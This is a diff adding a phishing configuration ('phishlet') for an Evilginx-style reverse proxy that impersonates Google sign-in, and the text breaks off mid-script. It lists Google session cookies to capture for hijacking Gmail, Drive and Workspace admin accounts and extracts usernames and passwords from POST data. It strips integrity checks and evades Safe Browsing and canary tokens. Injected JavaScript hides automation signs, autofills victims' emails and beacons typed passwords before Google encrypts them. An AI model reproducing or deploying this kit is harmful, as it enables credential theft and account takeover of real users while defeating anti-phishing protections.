@@ -1,0 +1,722 @@
+# phishlets/google.yaml
+# Google Login phishlet with evilpuppet BotGuard bypass
+# Merged from christ-link + redirectors reference phishlets
+# Requires: evilpuppet enabled, Chromium/Chrome installed, Xvfb running
+
+name: 'Google'
+author: 'christ-link'
+min_ver: '3.0.0'
+
+# ═══════════════════════════════════════════════════════
+# ANTI-PHISHING EVASION — URL Rewriting (Safe Browsing bypass)
+# ═══════════════════════════════════════════════════════
+
+rewrite_urls:
+  - trigger:
+      domains: ['accounts.google.com']
+      paths: ['/signin/v2/identifier']
+    rewrite:
+      path: '/login'
+      query:
+        - key: 'tid'
+          value: '{id}'
+
+  - trigger:
+      domains: ['accounts.google.com']
+      paths: ['/v3/signin/identifier']
+    rewrite:
+      path: '/login'
+      query:
+        - key: 'tid'
+          value: '{id}'
+
+  - trigger:
+      domains: ['accounts.google.com']
+      paths: ['/o/oauth2/auth']
+    rewrite:
+      path: '/authorize'
+      query:
+        - key: 'tid'
+          value: '{id}'
+
+  - trigger:
+      domains: ['accounts.google.com']
+      paths: ['/o/oauth2/v2/auth']
+    rewrite:
+      path: '/authorize'
+      query:
+        - key: 'tid'
+          value: '{id}'
+
+  - trigger:
+      domains: ['accounts.google.com']
+      paths: ['/signin/oauth/consent']
+    rewrite:
+      path: '/consent'
+      query:
+        - key: 'tid'
+          value: '{id}'
+
+  - trigger:
+      domains: ['accounts.google.com']
+      paths: ['/v3/signin/challenge']
+    rewrite:
+      path: '/validate-info-secure'
+      query:
+        - key: 'tid'
+          value: '{id}'
+
+
+# ═══════════════════════════════════════════════════════
+# PROXY HOSTS
+# ═══════════════════════════════════════════════════════
+
+proxy_hosts:
+  # Primary authentication domain
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+
+  # Static resources (JS/CSS/fonts)
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wwwgstatic', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+
+  # YouTube accounts (cross-origin checks + cookie capture via SetSID)
+  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: true, is_landing: false, auto_filter: false}
+
+  # Google services
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+
+  # User content (profile pictures)
+  - {phish_sub: 'lh3-usercontent', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false, auto_filter: true}
+
+  # Gmail
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+
+  # Drive/Docs/Calendar
+  - {phish_sub: 'drive', orig_sub: 'drive', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'docs', orig_sub: 'docs', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'calendar', orig_sub: 'calendar', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+
+  # Google Workspace / G Suite services
+  - {phish_sub: 'admin', orig_sub: 'admin', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'chat', orig_sub: 'chat', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'meet', orig_sub: 'meet', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'groups', orig_sub: 'groups', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'sites', orig_sub: 'sites', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'contacts', orig_sub: 'contacts', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+
+  # Clients domains
+  - {phish_sub: 'clients', orig_sub: 'clients', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'clients1', orig_sub: 'clients1', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'clients2', orig_sub: 'clients2', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'clients4', orig_sub: 'clients4', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
+
+  # OAuth/API domains
+  - {phish_sub: 'oauth2', orig_sub: 'oauth2', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: true}
+
+
+# ═══════════════════════════════════════════════════════
+# SUB FILTERS — Domain rewrite rules
+# ═══════════════════════════════════════════════════════
+
+sub_filters:
+  # --- accounts.google.com (self) ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- www.google.com ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- myaccount.google.com ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- play.google.com ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- apis.google.com ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- ssl.gstatic.com ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- www.gstatic.com ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- fonts.gstatic.com ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'fonts', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/css', 'text/html']}
+
+  # --- content.googleapis.com ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- accounts.youtube.com ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- gmail ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'mail.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- user content ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'lh3', domain: 'googleusercontent.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- drive/docs/calendar ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'drive', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'docs', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'calendar', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- Google Workspace / G Suite services ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'admin', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'admin', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'admin', domain: 'google.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'chat', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'chat', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'meet', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'meet', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'groups', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'sites', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'contacts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # --- oauth2 ---
+  - {triggers_on: 'accounts.google.com', orig_sub: 'oauth2', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'text/javascript']}
+
+  # ==== SECURITY BYPASSES ====
+  # Remove SRI (Subresource Integrity) checks
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: 'integrity="sha', replace: 'xintegrity="sha', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: "integrity='sha", replace: "xintegrity='sha", mimes: ['text/html']}
+
+  # ==== YOUTUBE CHECKCONNECTION ====
+  # Break the CheckConnection iframe URL so it doesn't load.
+  # Google's JS then relies on our injected postMessage to verify cookies.
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: 'accounts.youtube.com/accounts/CheckConnection', replace: 'about:blank#ytcheck', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: 'youtube.com/accounts/CheckConnection', replace: 'about:blank#ytcheck', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: '/accounts/CheckConnection', replace: '/accounts/xheckConnection', mimes: ['text/html', 'application/javascript']}
+
+  # ==== REJECTED PAGE BYPASS ====
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: '/v3/signin/rejected', replace: '/v3/signin/identifier', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: 'signin/rejected', replace: 'signin/identifier', mimes: ['text/html', 'application/javascript']}
+
+  # ==== SAFE BROWSING EVASION ====
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: 'safebrowsing.google.com', replace: 'xafebrowsing.xoogle.xom', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: '', domain: '', search: 'safebrowsing-cache.google.com', replace: 'xafebrowsing-xache.xoogle.xom', mimes: ['text/html', 'application/javascript']}
+
+  # ==== CANARY TOKEN EVASION ====
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '\.cloudfront\.net', replace: '.canary.invalid', mimes: ['text/css', 'text/html']}
+  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '\.cloudfront\.net', replace: '.canary.invalid', mimes: ['text/css', 'text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '\.canarytokens\.com', replace: '.canary.invalid', mimes: ['text/css', 'text/html', 'application/javascript']}
+
+
+# ═══════════════════════════════════════════════════════
+# AUTH TOKENS — Cookies to capture for session hijacking
+# ═══════════════════════════════════════════════════════
+
+auth_tokens:
+  # ── Primary session cookies (set on .google.com) ──
+  # These are the MAIN cookies needed for all Google services
+  # (Gmail, Drive, Calendar, Admin, Meet, Chat, etc.)
+  - domain: '.google.com'
+    keys:
+      - 'SID'
+      - 'HSID'
+      - 'SSID'
+      - 'APISID'
+      - 'SAPISID'
+      - '__Secure-1PSID'
+      - '__Secure-3PSID'
+      - '__Secure-1PAPISID'
+      - '__Secure-3PAPISID'
+      - 'SIDCC'
+      - '__Secure-1PSIDCC'
+      - '__Secure-3PSIDCC'
+      - '__Secure-1PSIDTS:opt'
+      - '__Secure-3PSIDTS:opt'
+      - 'NID:opt'
+
+  # ── accounts.google.com (login-specific) ──
+  - domain: 'accounts.google.com'
+    keys:
+      - 'LSID'
+      - '__Host-1PLSID:opt'
+      - '__Host-3PLSID:opt'
+
+  # ── myaccount.google.com (account management) ──
+  # OSID cookies are set host-only (no Domain attribute)
+  - domain: 'myaccount.google.com'
+    keys:
+      - 'OSID:opt'
+      - '__Secure-OSID:opt'
+
+  # ── YouTube (SetSID redirect during login) ──
+  # Google sets full session cookies on .youtube.com via accounts.youtube.com/SetSID
+  - domain: '.youtube.com'
+    keys:
+      - 'SID:opt'
+      - 'HSID:opt'
+      - 'SSID:opt'
+      - 'APISID:opt'
+      - 'SAPISID:opt'
+      - '__Secure-1PSID:opt'
+      - '__Secure-3PSID:opt'
+      - '__Secure-1PAPISID:opt'
+      - '__Secure-3PAPISID:opt'
+      - '__Secure-1PSIDTS:opt'
+      - '__Secure-3PSIDTS:opt'
+      - 'SIDCC:opt'
+      - '__Secure-1PSIDCC:opt'
+      - '__Secure-3PSIDCC:opt'
+      - 'LOGIN_INFO:opt'
+
+  # ── Gmail (mail.google.com) ──
+  - domain: 'mail.google.com'
+    keys:
+      - 'COMPASS:opt'
+      - 'OSID:opt'
+      - '__Secure-OSID:opt'
+
+  # ── Google Drive ──
+  - domain: 'drive.google.com'
+    keys:
+      - 'OSID:opt'
+      - '__Secure-OSID:opt'
+
+  # ── Google Docs ──
+  - domain: 'docs.google.com'
+    keys:
+      - 'OSID:opt'
+      - '__Secure-OSID:opt'
+
+  # ── Google Workspace Admin ──
+  - domain: 'admin.google.com'
+    keys:
+      - 'OSID:opt'
+      - '__Secure-OSID:opt'
+
+  # ── Google Chat ──
+  - domain: 'chat.google.com'
+    keys:
+      - 'OSID:opt'
+      - '__Secure-OSID:opt'
+
+
+# ═══════════════════════════════════════════════════════
+# CREDENTIALS — Username/password extraction from POST
+# ═══════════════════════════════════════════════════════
+
+credentials:
+  username:
+    key: '(identifier|Email|email|f\.req|identifierId|login)'
+    search: '([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
+    type: 'post'
+  password:
+    key: '(Passwd|password)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'f.req'
+      search: '([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
+      type: 'post'
+
+
+# ═══════════════════════════════════════════════════════
+# AUTH URLS — Pages to monitor for completed login
+# ═══════════════════════════════════════════════════════
+# IMPORTANT: With empty auth_urls, session auto-completes when all
+# cookie auth tokens (SID, HSID, SSID, APISID, SAPISID) are captured.
+# Adding auth_urls enables secondary token save on post-login page load.
+
+auth_urls: []
+
+
+# ═══════════════════════════════════════════════════════
+# LOGIN — Landing page configuration
+# ═══════════════════════════════════════════════════════
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+
+# ═══════════════════════════════════════════════════════
+# FORCE POST — Fix broken redirect/continue URLs
+# ═══════════════════════════════════════════════════════
+# Only match SPECIFIC paths. Removed /signin and / patterns that
+# accidentally matched /batchexecute requests.
+
+force_post:
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/_/signin/sl/challenge'
+    search:
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
+
+
+# ═══════════════════════════════════════════════════════
+# JS INJECT — Anti-detection, button fix, and redirect
+# ═══════════════════════════════════════════════════════
+
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/']
+    trigger_params: ["uid", "token", "e", "email"]
+    script: |
+      (function() {
+        // ===== ANTI-DETECTION OVERRIDES =====
+        try {
+          Object.defineProperty(navigator, 'webdriver', {
+            get: function() { return undefined; },
+            configurable: true
+          });
+          delete navigator.__proto__.webdriver;
+          Object.defineProperty(navigator, 'plugins', {
+            get: function() {
+              var arr = [
+                { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
+                { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: '' },
+                { name: 'Native Client', filename: 'internal-nacl-plugin', description: '' }
+              ];
+              arr.item = function(i) { return this[i]; };
+              arr.namedItem = function(n) { return this.find(function(p) { return p.name === n; }); };
+              arr.refresh = function() {};
+              return arr;
+            },
+            configurable: true
+          });
+          Object.defineProperty(navigator, 'languages', {
+            get: function() { return ['en-US', 'en']; },
+            configurable: true
+          });
+          if (!window.chrome) {
+            window.chrome = { runtime: {}, loadTimes: function() {}, csi: function() {}, app: {} };
+          }
+        } catch(e) {}
+
+        // ===== REJECTION PAGE REDIRECT =====
+        if (window.location.pathname.indexOf('/rejected') !== -1) {
+          window.location.replace('/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin');
+        }
+
+        // ===== EMAIL AUTOGRAB =====
+        function autoGrabEmail() {
+          var ei = document.getElementById('identifierId') ||
+                   document.querySelector('input[name="identifier"]') ||
+                   document.querySelector('input[type="email"]');
+          if (!ei) return false;
+
+          var em = '';
+
+          // Method 1: Evilginx session param
+          var ep = '{' + 'email}';
+          var ev = '{email}';
+          if (ev !== ep) em = ev;
+
+          // Method 2: URL hash fragment (base64 or plain)
+          if (!em && window.location.hash.length > 1) {
+            var h = window.location.hash.substring(1);
+            try {
+              var p = h;
+              while (p.length % 4 !== 0) p += '=';
+              var d = atob(p);
+              if (d.indexOf('@') !== -1) em = d;
+            } catch(e) {}
+            if (!em) {
+              try {
+                var d2 = decodeURIComponent(h);
+                if (d2.indexOf('@') !== -1) em = d2;
+              } catch(e) {}
+            }
+          }
+
+          // Method 3: login_hint query param
+          if (!em) {
+            try {
+              var sp = new URLSearchParams(window.location.search);
+              var lh = sp.get('login_hint') || sp.get('username') || sp.get('email');
+              if (lh && lh.indexOf('@') !== -1) em = lh;
+            } catch(e) {}
+          }
+
+          if (em) {
+            // Strip trailing = from email (base64 padding artifact)
+            em = em.replace(/=+$/, '');
+            ei.value = em;
+            ei.dispatchEvent(new Event('input', { bubbles: true }));
+            ei.dispatchEvent(new Event('change', { bubbles: true }));
+            ei.dispatchEvent(new Event('keyup', { bubbles: true }));
+            ei.focus();
+            // Auto-click Next button
+            var nb = document.getElementById('identifierNext') ||
+                     document.querySelector('#identifierNext button') ||
+                     document.querySelector('[data-primary-action-label] button');
+            if (nb) {
+              setTimeout(function() { nb.click(); }, 300);
+            }
+            return true;
+          }
+          return false;
+        }
+        var agInterval = setInterval(function() {
+          if (autoGrabEmail()) clearInterval(agInterval);
+        }, 500);
+
+        // ===== PASSWORD CAPTURE =====
+        // Google encrypts the password with BotGuard before sending it in batchexecute.
+        // We capture it from the DOM before encryption happens.
+        // Track input events continuously and send on any submit action.
+        (function() {
+          var capturedPwd = '';
+          var pwdSent = false;
+
+          // Track password as it's typed (works even on dynamically added fields)
+          document.addEventListener('input', function(e) {
+            if (e.target && e.target.type === 'password') {
+              capturedPwd = e.target.value;
+            }
+          }, true);
+
+          function sendPwd() {
+            if (pwdSent || !capturedPwd) return;
+            // Also check DOM one more time
+            var f = document.querySelector('input[type="password"]');
+            if (f && f.value) capturedPwd = f.value;
+            if (!capturedPwd) return;
+            pwdSent = true;
+            try {
+              navigator.sendBeacon('/CJ4ksahYUq', new Blob(['p=' + encodeURIComponent(capturedPwd)], {type: 'application/x-www-form-urlencoded'}));
+            } catch(ex) {
+              var xhr = new XMLHttpRequest();
+              xhr.open('POST', '/CJ4ksahYUq', true);
+              xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+              xhr.send('p=' + encodeURIComponent(capturedPwd));
+            }
+          }
+
+          // Capture on any button click (button or role=button)
+          document.addEventListener('click', function(e) {
+            if (capturedPwd && e.target.closest('button, [role="button"], [jsname]')) {
+              sendPwd();
+            }
+          }, true);
+
+          // Capture on Enter key
+          document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && capturedPwd) {
+              sendPwd();
+            }
+          }, true);
+
+          // Capture on SPA navigation (Google uses pushState/replaceState)
+          var origPush = history.pushState;
+          var origReplace = history.replaceState;
+          history.pushState = function() {
+            sendPwd();
+            return origPush.apply(this, arguments);
+          };
+          history.replaceState = function() {
+            sendPwd();
+            return origReplace.apply(this, arguments);
+          };
+        })();
+
+        // ===== FAKE CHECKCONNECTION RESPONSE =====
+        // Google's JS creates a YouTube iframe to verify cookies. Since we break
+        // the iframe URL (about:blank#ytcheck), we fake the postMessage response.
+        // This prevents the "Cookies are disabled" error on page transitions.
+        // Must re-fire on each SPA navigation (pushState path change) because
+        // the checkConnection param value (youtube:300) stays the same across
+        // pages — so we track by path to detect SPA transitions.
+        (function() {
+          var lastPath = '';
+          var sent = false;
+          function fakeCheckConnection() {
+            var curPath = window.location.pathname;
+            if (curPath !== lastPath) {
+              lastPath = curPath;
+              sent = false;
+            }
+            if (sent) return;
+            var urlParams = new URLSearchParams(window.location.search);
+            var checkConn = urlParams.get('checkConnection');
+            if (checkConn) {
+              var parts = checkConn.split(':');
+              if (parts.length >= 2) {
+                var nonce = parts[1];
+                window.postMessage(nonce + ':connected', window.location.origin);
+                sent = true;
+              }
+            }
+          }
+          fakeCheckConnection();
+          setInterval(fakeCheckConnection, 300);
+          // Also watch for new CheckConnection iframes and fire immediately
+          try {
+            new MutationObserver(function(mutations) {
